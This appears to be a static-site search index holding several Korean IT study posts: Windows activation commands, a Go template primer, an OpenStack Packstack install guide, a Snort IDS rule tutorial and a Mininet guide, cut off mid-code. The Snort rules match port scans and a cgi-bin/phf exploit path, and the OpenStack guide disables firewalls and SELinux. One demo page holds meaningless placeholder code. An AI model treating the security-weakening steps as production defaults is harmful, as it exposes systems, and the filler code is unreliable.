시디키를 구입하신 후에는 얼마든지 재인증을 할 수 있습니다.  만약 제거를 원하실 경우 하단의 명령어를 입력 후 재 시작하세요.\r$ slmgr.vbs /upk\r$ slmgr.vbs /cpky\r    위 그림은 인증 순서를 순서대로 입력한 그림입니다. 단 6개월 주기로 기간이 만료되니, 갱신이 필요합니다. Window 10 시디키는 보통 웹에서 저렴하게 구매가 가능하니, 오래 사용하실 분들은 구매하시는 걸 추천드립니다.     "});index.add({'id':142,'href':'/posts/goisforlovers/','title':"테스트",'content':"Hugo uses the excellent Go html/template library for its template engine. It is an extremely lightweight engine that provides a very small amount of logic. In our experience that it is just the right amount of logic to be able to create a good static website. If you have used other template systems from different languages or frameworks you will find a lot of similarities in Go templates.\nThis document is a brief primer on using Go templates. The Go docs provide more details.\nIntroduction to Go Templates Go templates provide an extremely simple template language. It adheres to the belief that only the most basic of logic belongs in the template or view layer. One consequence of this simplicity is that Go templates parse very quickly.\nA unique characteristic of Go templates is they are content aware. Variables and content will be sanitized depending on the context of where they are used. More details can be found in the Go docs.\nBasic Syntax Golang templates are HTML files with the addition of variables and functions.\nGo variables and functions are accessible within {{ }}\nAccessing a predefined variable \u0026ldquo;foo\u0026rdquo;:\n{{ foo }}\r Parameters are separated using spaces\nCalling the add function with input of 1, 2:\n{{ add 1 2 }}\r Methods and fields are accessed via dot notation\nAccessing the Page Parameter \u0026ldquo;bar\u0026rdquo;\n{{ .Params.bar }}\r Parentheses can be used to group items together\n{{ if or (isset .Params \u0026quot;alt\u0026quot;) (isset .Params \u0026quot;caption\u0026quot;) }} Caption {{ end }}\r Variables Each Go template has a struct (object) made available to it. In hugo each template is passed either a page or a node struct depending on which type of page you are rendering. More details are available on the variables page.\nA variable is accessed by referencing the variable name.\n\u0026lt;title\u0026gt;{{ .Title }}\u0026lt;/title\u0026gt;\r Variables can also be defined and referenced.\n{{ $address := \u0026quot;123 Main St.\u0026quot;}}\r{{ $address }}\r Functions Go template ship with a few functions which provide basic functionality. The Go template system also provides a mechanism for applications to extend the available functions with their own. Hugo template functions provide some additional functionality we believe are useful for building websites. Functions are called by using their name followed by the required parameters separated by spaces. Template functions cannot be added without recompiling hugo.\nExample:\n{{ add 1 2 }}\r Includes When including another template you will pass to it the data it will be able to access. To pass along the current context please remember to include a trailing dot. The templates location will always be starting at the /layout/ directory within Hugo.\nExample:\n{{ template \u0026quot;chrome/header.html\u0026quot; . }}\r Logic Go templates provide the most basic iteration and conditional logic.\nIteration Just like in Go, the Go templates make heavy use of range to iterate over a map, array or slice. The following are different examples of how to use range.\nExample 1: Using Context\n{{ range array }}\r{{ . }}\r{{ end }}\r Example 2: Declaring value variable name\n{{range $element := array}}\r{{ $element }}\r{{ end }}\r Example 2: Declaring key and value variable name\n{{range $index, $element := array}}\r{{ $index }}\r{{ $element }}\r{{ end }}\r Conditionals If, else, with, or, \u0026amp; and provide the framework for handling conditional logic in Go Templates. Like range, each statement is closed with end.\nGo Templates treat the following values as false:\n false 0 any array, slice, map, or string of length zero  Example 1: If\n{{ if isset .Params \u0026quot;title\u0026quot; }}\u0026lt;h4\u0026gt;{{ index .Params \u0026quot;title\u0026quot; }}\u0026lt;/h4\u0026gt;{{ end }}\r Example 2: If -\u0026gt; Else\n{{ if isset .Params \u0026quot;alt\u0026quot; }}\r{{ index .Params \u0026quot;alt\u0026quot; }}\r{{else}}\r{{ index .Params \u0026quot;caption\u0026quot; }}\r{{ end }}\r Example 3: And \u0026amp; Or\n{{ if and (or (isset .Params \u0026quot;title\u0026quot;) (isset .Params \u0026quot;caption\u0026quot;)) (isset .Params \u0026quot;attr\u0026quot;)}}\r Example 4: With\nAn alternative way of writing \u0026ldquo;if\u0026rdquo; and then referencing the same value is to use \u0026ldquo;with\u0026rdquo; instead. With rebinds the context . within its scope, and skips the block if the variable is absent.\nThe first example above could be simplified as:\n{{ with .Params.title }}\u0026lt;h4\u0026gt;{{ . }}\u0026lt;/h4\u0026gt;{{ end }}\r Example 5: If -\u0026gt; Else If\n{{ if isset .Params \u0026quot;alt\u0026quot; }}\r{{ index .Params \u0026quot;alt\u0026quot; }}\r{{ else if isset .Params \u0026quot;caption\u0026quot; }}\r{{ index .Params \u0026quot;caption\u0026quot; }}\r{{ end }}\r Pipes One of the most powerful components of Go templates is the ability to stack actions one after another. This is done by using pipes. Borrowed from unix pipes, the concept is simple, each pipeline\u0026rsquo;s output becomes the input of the following pipe.\nBecause of the very simple syntax of Go templates, the pipe is essential to being able to chain together function calls. One limitation of the pipes is that they only can work with a single value and that value becomes the last parameter of the next pipeline.\nA few simple examples should help convey how to use the pipe.\nExample 1 :\n{{ if eq 1 1 }} Same {{ end }}\r is the same as\n{{ eq 1 1 | if }} Same {{ end }}\r It does look odd to place the if at the end, but it does provide a good illustration of how to use the pipes.\nExample 2 :\n{{ index .Params \u0026quot;disqus_url\u0026quot; | html }}\r Access the page parameter called \u0026ldquo;disqus_url\u0026rdquo; and escape the HTML.\nExample 3 :\n{{ if or (or (isset .Params \u0026quot;title\u0026quot;) (isset .Params \u0026quot;caption\u0026quot;)) (isset .Params \u0026quot;attr\u0026quot;)}}\rStuff Here\r{{ end }}\r Could be rewritten as\n{{ isset .Params \u0026quot;caption\u0026quot; | or isset .Params \u0026quot;title\u0026quot; | or isset .Params \u0026quot;attr\u0026quot; | if }}\rStuff Here\r{{ end }}\r Context (aka. the dot) The most easily overlooked concept to understand about Go templates is that {{ . }} always refers to the current context. In the top level of your template this will be the data set made available to it. Inside of a iteration it will have the value of the current item. When inside of a loop the context has changed. . will no longer refer to the data available to the entire page. If you need to access this from within the loop you will likely want to set it to a variable instead of depending on the context.\nExample:\n {{ $title := .Site.Title }}\r{{ range .Params.tags }}\r\u0026lt;li\u0026gt; \u0026lt;a href=\u0026quot;{{ $baseurl }}/tags/{{ . | urlize }}\u0026quot;\u0026gt;{{ . }}\u0026lt;/a\u0026gt; - {{ $title }} \u0026lt;/li\u0026gt;\r{{ end }}\r Notice how once we have entered the loop the value of {{ . }} has changed. We have defined a variable outside of the loop so we have access to it from within the loop.\nHugo Parameters Hugo provides the option of passing values to the template language through the site configuration (for sitewide values), or through the meta data of each specific piece of content. You can define any values of any type (supported by your front matter/config format) and use them however you want to inside of your templates.\nUsing Content (page) Parameters In each piece of content you can provide variables to be used by the templates. This happens in the front matter.\nAn example of this is used in this documentation site. Most of the pages benefit from having the table of contents provided. Sometimes the TOC just doesn\u0026rsquo;t make a lot of sense. We\u0026rsquo;ve defined a variable in our front matter of some pages to turn off the TOC from being displayed.\nHere is the example front matter:\n---\rtitle: \u0026quot;Permalinks\u0026quot;\rdate: \u0026quot;2013-11-18\u0026quot;\raliases:\r- \u0026quot;/doc/permalinks/\u0026quot;\rgroups: [\u0026quot;extras\u0026quot;]\rgroups_weight: 30\rnotoc: true\r---\rHere is the corresponding code inside of the template:\n {{ if not .Params.notoc }}\r\u0026lt;div id=\u0026quot;toc\u0026quot; class=\u0026quot;well col-md-4 col-sm-6\u0026quot;\u0026gt;\r{{ .TableOfContents }}\r\u0026lt;/div\u0026gt;\r{{ end }}\r Using Site (config) Parameters In your top-level configuration file (eg, config.yaml) you can define site parameters, which are values which will be available to you in chrome.\nFor instance, you might declare:\nparams:\rCopyrightHTML: \u0026#34;Copyright \u0026amp;#xA9; 2013 John Doe. All Rights Reserved.\u0026#34;\rTwitterUser: \u0026#34;spf13\u0026#34;\rSidebarRecentLimit: 5\rWithin a footer layout, you might then declare a \u0026lt;footer\u0026gt; which is only provided if the CopyrightHTML parameter is provided, and if it is given, you would declare it to be HTML-safe, so that the HTML entity is not escaped again. This would let you easily update just your top-level config file each January 1st, instead of hunting through your templates.\n{{if .Site.Params.CopyrightHTML}}\u0026lt;footer\u0026gt;\r\u0026lt;div class=\u0026quot;text-center\u0026quot;\u0026gt;{{.Site.Params.CopyrightHTML | safeHtml}}\u0026lt;/div\u0026gt;\r\u0026lt;/footer\u0026gt;{{end}}\rAn alternative way of writing the \u0026ldquo;if\u0026rdquo; and then referencing the same value is to use \u0026ldquo;with\u0026rdquo; instead. With rebinds the context . within its scope, and skips the block if the variable is absent:\n{{with .Site.Params.TwitterUser}}\u0026lt;span class=\u0026quot;twitter\u0026quot;\u0026gt;\r\u0026lt;a href=\u0026quot;https://twitter.com/{{.}}\u0026quot; rel=\u0026quot;author\u0026quot;\u0026gt;\r\u0026lt;img src=\u0026quot;/images/twitter.png\u0026quot; width=\u0026quot;48\u0026quot; height=\u0026quot;48\u0026quot; title=\u0026quot;Twitter: {{.}}\u0026quot;\ralt=\u0026quot;Twitter\u0026quot;\u0026gt;\u0026lt;/a\u0026gt;\r\u0026lt;/span\u0026gt;{{end}}\rFinally, if you want to pull \u0026ldquo;magic constants\u0026rdquo; out of your layouts, you can do so, such as in this example:\n\u0026lt;nav class=\u0026quot;recent\u0026quot;\u0026gt;\r\u0026lt;h1\u0026gt;Recent Posts\u0026lt;/h1\u0026gt;\r\u0026lt;ul\u0026gt;{{range first .Site.Params.SidebarRecentLimit .Site.Recent}}\r\u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;{{.RelPermalink}}\u0026quot;\u0026gt;{{.Title}}\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\r{{end}}\u0026lt;/ul\u0026gt;\r\u0026lt;/nav\u0026gt;\r"});index.add({'id':143,'href':'/docs/cloudcomputing/openstacktraining/openstack%EC%84%A4%EC%B9%98/','title':"Openstack설치",'content':"OpenStack   설치 방법  메뉴얼을 이용한 설치 자동화 툴을 이용한 설치 ( Packstack, Devstack )      packstack을 이용한 설치   0. 설치환경\n   Hostname IP 운영체제 cpu 메모리 디스크      controller 192.168.1.98 CentOS7 2 4 50gb    compute 192.168.1.99 CentOS7 2 4 200gb    network 192.168.1.100 CentOS7 1 2 50gb                1. 전체 설치 과정\n 전체 노드에 기본적인 네트워크 유틸리티 설치  yum -y install bind-utils\r  모든 노드에 호스트 설정 /etc/hosts  192.168.1.98 controller\r192.168.1.99 compute\r192.168.1.100 network\r  각 노드에 맞는 호스트 네임 설정 /etc/hostname  // controller 노드\rcontroller\r// computer 노드\rcompute\r// network 노드\rnetwork\r  2. 방화벽 설정\n 모든 노드  systemctl stop firewalld\rsystemctl disable firewalld\rsystemctl stop NetworkManager\rsystemctl disable NetworkManager\rsetenforce 0\rsed -i \u0026#39;s/=enforcing/=disabled/g\u0026#39; /etc/sysconfig/selinux\r  재시작  init 6\r  3. ssh 설정\n controller 노드 ssh-keygen 실행 yes 선택 후, 나머지 값 기본 값 선택  ssh-keygen\r  ssh 등록  ssh-copy-id root@controller\rssh-copy-id root@compute\rssh-copy-id root@network\r  4. 오픈스택 설치 파일 다운\n controller 노드  yum update -y\ryum install centos-release-openstack-rocky -y\ryum install openstack-packstack -y\ryum install openstack-utils -y\ryum install chrony ntp -y\r 5. 오픈스택 설치 룰 생성\n controller 노드  packstack --gen-answer-file=/root/rocky-answer.txt\r  5. 오픈스택 설치 룰 수정\n /rooot/rocky-answer.txt 파일을 수정 CONFIG_CONTROLLER_HOST=[컨트롤러 노드 IP] CONFIG_COMPUTE_HOSTS=[컴퓨트 노드 IP] CONFIG_NETWORK_HOSTS=[네트워크 노드 IP]  CONFIG_CONTROLLER_HOST= 192.168.1.98\r# controller Node\rCONFIG_COMPUTE_HOSTS= 192.168.1.100\r# compute Node, CONFIG_NETWORK_HOSTS= 192.168.1.99\r# Network node\rCONFIG_PROVISION_DEMO=n\rCONFIG_NTP_SERVERS=0.centos.pool.ntp.org iburst, 1.centos.pool.ntp.org iburst, 2.centos.pool.ntp.org iburst, 3.centos.pool.ntp.org iburst\rCONFIG_CINDER_VOLUMES_SIZE=200G\r  6. 오픈스택 설치 시작\n controller 노드  packstack --answer-file=/root/rocky-answer.txt\r 7. 확인\n 컨트롤러 IP로 진입   8. 올인원 설치방법\n 설정파일을 생성하지 않고 명령어 실행  packstack --allinone\r  특정 노드 추가\u0026amp; 변경  \r예시) 컴퓨터 노드 추가\r↕\r\r 특정 노드 추가\u0026amp; 변경   IP, hosts 등 기본 설정 controller 노드의 설치 파일을 수정  vi /root/rocky-answer.txt    CONFIG_COMPUTE_HOSTS=[ 추가할 노드의 IP ]\rEXCLUDE_SERVERS=[ 제외 아이피 ( 이미 설치 되어있는 노드들의 IP) ]\r설치진행  packstack --answer-file=/root/rocky-answer.txt\r\r\r\r\r   네트워크 노드 가상화  ifcfg-ens33 수정  DEVICE=ens33\rTYPE=OVSPort\rDEVICETYPE=ovs\rOVS_BRIDGE=br-ex\rONBOOT=yes\r  ifcfg-br-ex 생성 후 수정  DEVICE=br-ex\rDEVICETYPE=ovs\rTYPE=OVSBridge\rBOOTPROTO=static\rIPADDR=192.168.1.99\rNETMASK=255.255.255.0\rGATEWAY=192.168.1.1\rONBOOT=yes\r  네트워크 재시작  systemctl restart network\t  확인  ovs-vsctl show\r  openstack 서비스 재시작  openstack-service list | xargs systemctl restart\r  대시보드 에러시 수정  /etc/httpd/conf.d/15-horizon_vhost.conf  # ************************************\r # Vhost template in module puppetlabs-apache\r # Managed by Puppet\r # ************************************\r \u0026lt;VirtualHost *:80\u0026gt;\rServerName controller\rServerAlias 192.168.1.98\rServerAlias [ 진입할 다른 대역 IP ]\rServerAlias controller\rServerAlias localhost\rWSGIApplicationGroup %{GLOBAL}\rWSGIDaemonProcess apache display-name=horizon group=apache processes=2 threads=1 user=apache\rWSGIProcessGroup apache\rWSGIScriptAlias /dashboard \u0026#34;/usr/share/openstack-dashboard/openstack_dashboard/wsgi/djanhtml.wsgi\u0026#34;\r## Vhost docroot\r DocumentRoot \u0026#34;/var/www/\u0026#34;\r## Alias declarations for resources outside the DocumentRoot\r Alias /dashboard/static \u0026#34;/usr/share/openstack-dashboard/static\u0026#34;\r## Directories, there should at least be a declaration for /var/www/\r \u0026lt;Directory \u0026#34;/var/www/\u0026#34;\u0026gt;\rOptions Indexes FollowSymLinks MultiViews\rAllowOverride None\rRequire all granted\r\u0026lt;/Directory\u0026gt;\r\u0026lt;Directory \u0026#34;/usr/share/openstack-dashboard/openstack-dashboard/wsgi\u0026#34;\u0026gt;\rOptions All\rAllowOverride All\rRequire all granted\r\u0026lt;/Directory\u0026gt;\r\u0026lt;Directory \u0026#34;/usr/share/openstack-dashboard/static\u0026#34;\u0026gt;\rOptions All\rAllowOverride All\rRequire all granted\r\u0026lt;/Directory\u0026gt;\r## Logging\r ErrorLog \u0026#34;/var/log/httpd/horizon_error.log\u0026#34;\rServerSignature Off\rCustomLog \u0026#34;/var/log/httpd/horizon_access.log\u0026#34; combined\r## RedirectMatch rules\r RedirectMatch permanent ^/$ /dashboard\r## Server aliases\r \u0026lt;/VirtualHost\u0026gt;\r"});index.add({'id':144,'href':'/docs/hidden/','title':"Hidden",'content':"This page is hidden in menu Quondam non pater est dignior ille Eurotas Latent te facies Lorem markdownum arma ignoscas vocavit quoque ille texit mandata mentis ultimus, frementes, qui in vel. Hippotades Peleus pennas conscia cuiquam Caeneus quas.\n Pater demittere evincitque reddunt Maxime adhuc pressit huc Danaas quid freta Soror ego Luctus linguam saxa ultroque prior Tatiumque inquit Saepe liquitur subita superata dederat Anius sudor  Cum honorum Latona O fallor in sustinui iussorum equidem. Nymphae operi oris alii fronde parens dumque, in auro ait mox ingenti proxima iamdudum maius?\nreality(burnDocking(apache_nanometer),\rpad.property_data_programming.sectorBrowserPpga(dataMask, 37,\rrecycleRup));\rintellectualVaporwareUser += -5 * 4;\rtraceroute_key_upnp /= lag_optical(android.smb(thyristorTftp));\rsurge_host_golden = mca_compact_device(dual_dpi_opengl, 33,\rcommerce_add_ppc);\rif (lun_ipv) {\rverticalExtranet(1, thumbnail_ttl, 3);\rbar_graphics_jpeg(chipset - sector_xmp_beta);\r}\r Fronde cetera dextrae sequens pennis voce muneris Acta cretus diem restet utque; move integer, oscula non inspirat, noctisque scelus! Nantemque in suas vobis quamvis, et labori!\nvar runtimeDiskCompiler = home - array_ad_software;\rif (internic \u0026gt; disk) {\remoticonLockCron += 37 + bps - 4;\rwan_ansi_honeypot.cardGigaflops = artificialStorageCgi;\rsimplex -= downloadAccess;\r}\rvar volumeHardeningAndroid = pixel + tftp + onProcessorUnmount;\rsector(memory(firewire + interlaced, wired)); "});index.add({'id':145,'href':'/docs/network/snort/snort/','title':"Snort",'content':"Snort를 이용한 IDS/IPS 구축   침입 탐지 시스템(IDS) \u0026ndash; Snort  Snort   Snort란 일종의 침입탐지시스템(IDS:Intrusion Detection System)으로 실시간 트래픽 분석, 프로토콜 분석, 내용검색/매칭, 침입탐지 Rule에 의거하여 오버플로우, 포트스캔, CGI공격, OS확인 시도 등의 다양한 공격과 스캔을 탐지할 수 있다. 침입탐지 Rule은 보안 커뮤니티를 통해 지속적으로 업데이트되고 또한 사용자가 직접 Rule을 작성하여 추가할 수 있도록 설계되어 최신공격에 대한 적응에 빨리 대처하는 오픈소스 서비스     Snort의 주 기능  탐지(Detection) 잘못된 패킷을 감지하면 사용자에게 알림(주체적으로 처리하지 X, only 안내)     **Snort 탐지의 종류 **     종류 역할     오용 탐지 알고 있는 것 탐지   이상 탐지 모르는 것도 탐지(100% 탐지 X)     너무 민감하게 처리하면 필요한 정보도 차단하는 실수를 할 수 있음     Snort 설치위치에 따른 역할 ( 성능이 달라짐 )   패킷이 라우터로 들어오기 전  내부 네트워크로 들어오는 모든 패킷은 IDS를 거침 쓸 데 없는 패킷을 많이 훑기 때문에 효율적이지 X 일반적으로 정상적인 패킷이 더 많음     라우터 뒤    라우터의 패킷 필터링을 거친 패킷을 검사 라우터 전보다는 성능저하 덜 적음 but, 공격 패킷 탐지는 낮아질 수 있음   방화벽 뒤    일반적으로 2, 3, 4계층 패킷을 거름(5, 6, 7계층도 거름)   내부 네트워크    내부의 클라이언트를 신뢰할 수 없어 내부 네트워크 해킹을 감시하려 할 때 설치 내부 네트워크에 대한 해킹 피해를 방지하기 위해     Snort 설치  CentOS 7  의존성 관련 프로그램 설치   $ yum -y install http://download-ib01.fedoraproject.org/pub/epel/7/x86_64/Packages/d/daq-2.0.6-1.el7.x86_64.rpm $ yum -y install gcc gcc-c++ flex bison zlib libpcap pcre libdnet tcpdump $ yum -y install ftp://ftp.pbone.net/mirror/archive.fedoraproject.org/epel/7/x86_64/Packages/l/libnghttp2-1.31.1-1.el7.x86_64.rpm  Snort 설치   mkdir /[ doc ] cd /[ doc ] $ wget http://ftp.psu.ac.th/pub/snort/libdnet-1.12.tgz $ tar zxvf libdnet-1.12.tgz $ cd libdnet-1.12 $ ./configure $ make $ make install    Ubuntu18.04  $ apt-get -y update $ apt-get -y upgrade $ apt-get install snort  rpm을 통한 Snort 공통 설치    Snort 다운로드   - wget https://www.snort.org/downloads/snort/snort-2.9.16-1.centos7.x86_64.rpm - rpm -ivh snort....    스노트 기본 설정   /etc/snort/snort.conf 파일에서 기존의 룰 제거    dynamicdetection directory /usr/local/lib/snort_dynamicrules \u0026ndash;\u0026gt; # dynamicdetection directory /usr/local/lib/snort_dynamicrules   511번, 512번 줄 맨 앞에 # 추가   whitelist $WHITE_LIST_PATH/white_list.rules, \\ \u0026ndash;\u0026gt; # whitelist $WHITE_LIST_PATH/white_list.rules, \\ blacklist $BLACK_LIST_PATH/black_list.rules \u0026ndash;\u0026gt; # blacklist $BLACK_LIST_PATH/black_list.rules   548번, 651번 줄까지 맨 앞에 # 추가 or 삭제    include \u0026hellip;\u0026hellip; \u0026ndash;\u0026gt; # include\n  cd /etc/snort/rules\n  vi local.rules\n  alert icmp any any -\u0026gt; any any ( msg:\u0026ldquo;ICMP Detected\u0026rdquo;; sid:1000001; )\n  [액션][프로토콜][출발지IP][출발지포트]\t[목적지IP][목적지포트]\t[옵션]\n   snort 실행   snort -c /etc/snort/snort.conf -i ens33   snort 실행확인    tail -f /var/log/snort/alert\n  *tip : snort.log로 시작하는 파일은 문서 파일이 아닌 실행 파일\n  snort 종료하면 나오는 보고서 형식으로 작성됨\n  snort -r 옵션으로 해당 파일을 볼 수 있음\n     Snort rules  Rule 형태 [RuleHeader] [tcp, udp, icmp, ip] [출발지IP] [포트] [-\u0026gt;, \u0026lt;\u0026gt;] [도착지IP] [포트] [RuleOption] ex) alert icmp any any -\u0026gt; any any ( msg:\u0026#34;ICMP Detected\u0026#34;; sid:1000001; )    Rule Header   Rule Action      Rule Header Action     **alert ** 룰에 일치하는 경우 경고를 발생 시키고 로그로 기록한다.   **log ** 로그로 기록한다.   **pass ** 패킷을 무시한다.   **drop ** 패킷을 차단하고 로그로 남긴다.   **reject ** 패킷을 차단하고 로그로 남긴다, 그리고 tcp 패킷의 경우 rst 패킷을 응답하고 udp 패킷의 경우 icmp unreachable 패킷으로 응답한다.   **sdrop ** 패킷을 차단하고 로그를 남기지 않는다.       프로토콜   TCP, UDP, ICMP, IP     IP 주소    any는 모든 IP\n  논리부정연산자(!) 사용 가능\n  여러 IP주소에 대한 표기 [] 사용, 콤마(,)로 구분\n  ex) !192.168.1.0/24 ![192.168.1.0/24,10.1.1.0/24]\n     포트 번호    1:1024 = 1 ~ 1024\n  :1024 = 1024 port 이하\n  1024: = 1024 port 이상\n  !1:1024 = 1 ~ 1024 port를 제외한 나머지\n     패킷 방향   -\u0026gt; outgoing 패킷 \u0026lt;- 존재하지 않는다 \u0026lt;\u0026gt; 양방향  Rule Option    Rule Option은 새미콜론(;)으로 구분한다.\n  general : 룰에 대한 정보를 포함하는 옵션\n  msg : alert 엔진을 통해 전달하는 메시지를 설정할 수 있다.\n  ex) msg:\u0026ldquo;\u0026rdquo;;\n  sid : Snort ID의 약자로 룰을 식별하기 위해 사용된다.\n  ex)sid:;\n  payload : 패킷 내 페이로드 내부의 데이터를 찾고 상호작용을 할 수 있는 옵션\n  content : 페이로드 내 존재하는 특정 문자열이나 헥스 값 등을 판별하여 룰에 영향을 줄 수 있다. 사실상 가장 많이 쓰일 것 같다. 헥스 값의 경우 ‘|’ 으로 감싸주어 사용 가능하다.\n  ex)content :[!]\u0026ldquo;\u0026rdquo;;\n  depth : 지정된 패턴을 검색 시 패킷의 길이를 지정할 수 있다. depth가 5인 경우 페이로드의 처음 5바이트 내에서 지정된 패턴을 찾는다. offset 키워드와 함께 사용 가능하다.\n  offset : depth와 비슷하며 함께 자주 쓰인다. 말 그대로 해당 오프셋부터 패턴을 검색한다. offset이 5인 경우 offset 5부터 지정된 패턴을 검색한다.\n  ex) alert tcp any any -\u0026gt; any 80 (content:\u0026ldquo;cgi-bin/phf\u0026rdquo;; offset:4; depth:20;)\n  80(http/tcp)로 접근하는 모든 패킷의 offset 4부터 20바이트 내 cgi-bin/phf 문자열이 존재하는지 확인한다.\n  non-payload : 페이로드가 없는 데이터에서 사용\n  fragoffset : IP Fragment 오프셋 필드의 값을 비교할 수 있다.\n  ex)fragoffset:[!]\u0026lt;|\u0026gt;];\n  ttl : TTL(Time To Live) 항목이다. traceroute 명령어를 탐지하기 위한 키워드이다.\n  ex)ttl:[\u0026lt;,\u0026gt;,=,\u0026lt;=,\u0026gt;=]; , ttl:[]-[\u0026lt;number];\n  fragbits : 단편화된 패킷이거나 IP Header 내 flags 필드에 비트가 설정되어 있는지 확인하는데 사용된다.\n  ex)fragbits:MD+; More Fragments bit \u0026amp; Don’t Fragments bit\n  flags : TCP flag 비트를 확인하는데 사용한다. 기본적으로 UAPRSF(URG, ACK, PSH, RST, SYN, FIN)를 확인할 수 있고, 추가적으로 CWR, ECE 를 사용할 수 있다.\n  ex) alert tcp any any -\u0026gt; any any (flags:SF;) 모든 패킷에 SYN과 FIN 패킷을 탐지한다.\n  탐지 가능한 공격 : X-Mas 스캔, Null 스캔\n  X-Max 스캔\n  alert tcp any any -\u0026gt; any any (mag:\u0026#34;X-Max Scan Detected!!\u0026#34;; flags:FPU; sid:1000004;)  Null 스캔  alert tcp any any -\u0026gt; any any (mag:\u0026#34;Null Scan Detected!!\u0026#34;; flags:0; sid:1000005;)  threshold 옵션 : 행위기반 탐지가 가능한 옵션 track by_src : 동일한 출발지에서 track by_dst : 동일한 목적지로  threshold:type threshold, limit, both # 패킷량, 임계시간 임계시간 단위당 로그 발생량   count : 수\n  seconds : 초\n  seq : TCP sequence number를 확인한다.\n  ex) seq:0;\n  ack : TCP acknowledge number를 확인한다.\n  ex) ack:0;\n  Post-detection : 사후탐지에 대한 옵션, 룰 실행 후의 규칙\n  react : 패킷을 차단하거나 경고 메시지를 출력한다.\n  react:block; : 패킷을 차단한다\n  ARP 탐지 추가\n  vi /etc/snort/snort.conf ARP spoot 수정 preprocessor arpspoof_detect_host: [ IP 주소 ] [ MAC 주소 ]\n  preprocessos : snort.conf 파일에 설정하는 전처리 기능\n  itype : ICMP Type 지정\n  icode : ICMP Type의 Code 지정\n  ICMP Redirect 탐지, ICMP 요청만 탐지\n     Snort 사용법 "});index.add({'id':146,'href':'/docs/network/%EC%A0%95%EB%A6%AC%EC%A0%84/sdn/','title':"S D N",'content':"SDN   SDN ( Software Defined Networking : 소프트웨어 정의 네트워킹 )    기존의 네트워크 인프라가 가지고 있던 문제를 해결하기 위해서 나온 개념\n  기존의 네트워크 인프라를 구성하는 네트워크 장비들은 하나의 장비에 HW OS APP이 모두 들어가 있었기 때문에 장비 하나하나가 복잡한 기능을 모두 가지고 있었고 장비 자체의 사양도 높아야 했다. 그러다보니 장비마다 비용도 비싸지고 장비를 하나하나 설정해야하는 문제점들이 있었다.\n  SDN은 기존의 장비의 HW와 OS APP 부분을 분리하여 장비 하나하나는 HW부분만을 담당하고 SW적인 부분은 중앙의 컨트롤러에서 제어한다.\n  중앙 컨트롤러에서 모든 것을 제어하기 때문에 네트워크 인프라의 변경이나 확장에 좀 더 유연하게 대처할 수 있다.\n   SDN 구조적 구성요소    SDN Application\n  SDN Controller\n  SDN Datapath\n  SDN Control to Data-Plane Interface ( DPI )\n  SDN Nothbound Interfaces ( NBI )\n   Openflow    OpenFlow는 SDN을 구현하기 위해 처음으로 제정된 표준 인터페이스 ( Protocol )\n  OpenFlow 스위치와 OpenFlow 컨트롤러로 구성되며 흐름(flow) 정보를 제어하여 패킷의 전달 경로 및 방식을 결정한다.\n  OpenFlow 스위치\n  SW : OpenFlow 컨트롤러에게 OpenFlow 프로토콜로 제어 정보를 요청 또는 전달받는 SW\n  HW : OpenFlow 컨트롤러에게 전달받은 정보를 저장하고 해당 정보를 토대로 패킷을 시스템에 전달\n    OpenFlow 컨트롤러\n  OpenFlow 스위치로부터 정보 요청을 받으면 내부에 존재하는 패킷 제어 정보를 확인하고 해당 결과를 OpenFlow 스위치에 전달\n  패킷 제어 정보는 외부의 프로그램에서 API를 통해 입력 가능\n     SDN 환경 구축환경 구축환경 : Vmware\nOS : ubuntu 16.04\napt-get update\rapt-get install open-vm-tools\rapt-get install git\r       Mininet   Mininet 설치   Mininet은 일반 PC에서 쉽게 가상의 네트워크 환경을 구성하여, Openflow를 활용한 SDN과 같은 네트워크 환경을 구성해볼 수 있는 에뮬레이터, 파이썬 API를 지원하여 간단한 프로그래밍으로 네트워크 토폴로지 구성이 가능   \rMininet 설치\r...\r\rgit clone git://github.com/mininet/mininet\rcd mininet\rmininet/util/install.sh -a\r# mininet install\r git tag # list available versions\r git checkout -b 2.2.1 2.2.1 # or whatever version you wish to install\r cd ..\r\r\r\r\r  미니넷 실행  mn --switch ovs --topo single,3 --test pingall\r# single의 토폴로지로 3개의 노드를 테스트한다.\r mn --switch ovs --topo single,3\r# single의 토폴로지로 3개의 노드를 실행단다.\r mininet\u0026gt; h2 ping g3\r# 노드간 통신 확인\r  미니넷 네트워크 토폴로지 종류\n  Single : 하나의 스위치에 N개의 호스트가 연결된 형태\n  Linear : N개의 스위치에 M개의 호스트가 연결된 형태, M을 지정하지 않으면 스위치 하나에 호스트 하나 할당\n  Tree : 지정한 깊이(레벨), fanout(자식)의 트리 형태로 연결됨\n  Torus : N*M 형식으로 연결된 형태\n  \r 네트워크 토폴로지 설정   파이썬을 이용한 방법    mkdir /[ Doc ] cd /[ Doc ]   코드 설명\n Topo 클래스를 상속받은 SingleTopo클래스를정의 addSwitch(\u0026lsquo;스위치명\u0026rsquo;) : 스위치명의 이름으로 스위치 생성 addHost(\u0026lsquo;호스트명\u0026rsquo;) : 호스트명의 이름으로 호스트 생성 addLink(장치1, 장치2) : 장치1과 장치2를 연결하는 링크 생성 dumpNodeConnections() : 스위치 또는 호스트 연결 정보 확인 pingAll() : 모든 호스트들끼리 통신 확인 \r\r  vi [ File name.py ]   \rCustom topo\r...\r\rfrom mininet.topo import Topo\rclass MyTopo( Topo ):\r\u0026#34;Simple topology example.\u0026#34;\rdef __init__( self ):\r\u0026#34;Create custom topo.\u0026#34;\r# Initialize topology\r Topo.__init__( self )\r# Add hosts and switches\r leftHost = self.addHost( \u0026#39;h1\u0026#39; )\rrightHost = self.addHost( \u0026#39;h2\u0026#39; )\rleftSwitch = self.addSwitch( \u0026#39;s3\u0026#39; )\rrightSwitch = self.addSwitch( \u0026#39;s4\u0026#39; )\r# Add links\r self.addLink( leftHost, leftSwitch )\rself.addLink( leftSwitch, rightSwitch )\rself.addLink( rightSwitch, rightHost )\rtopos = { \u0026#39;mytopo\u0026#39;: ( lambda: MyTopo() ) }\r\r\r\r\r  \rSingle Code\r...\r\r#-*- coding: utf-8 -*-\r #!/usr/bin/python\r from mininet.topo import Topo\rfrom mininet.net import Mininet\rfrom mininet.util import irange,dumpNodeConnections\rfrom mininet.log import setLogLevel\rfrom mininet.cli import CLI\rclass SingleTopo(Topo):\rdef __init__(self, k=1, **opts):\rsuper(SingleTopo, self).__init__(**opts)\rswitch = self.addSwitch(\u0026#39;s1\u0026#39;)\rfor i in range(1,k+1):\rhost = self.addHost(\u0026#39;h%s\u0026#39; % i)\rself.addLink(host, switch)\rdef 